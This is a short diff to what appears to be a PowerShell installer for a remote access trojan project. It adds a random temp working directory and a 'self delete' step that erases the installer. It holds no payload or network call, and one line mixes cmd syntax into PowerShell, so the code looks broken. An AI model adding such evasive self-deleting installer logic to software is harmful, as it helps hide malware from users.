@@ -17,12 +17,15 @@ function random_text{
 ## Variables
 $wd = random_text
 $path = "$env:temp/$wd"
-echo $path
+$initial_dir = %cd%
 
 #goto temp and make working directory
 
 mkdir $path
 cd $path
-echo "" > poc.txt
-cd: C:\Users\lukee\Documents\GitHub\RAT\files
-pause
+
+
+
+# self delete
+cd $initial_dir
+del Installer.ps1
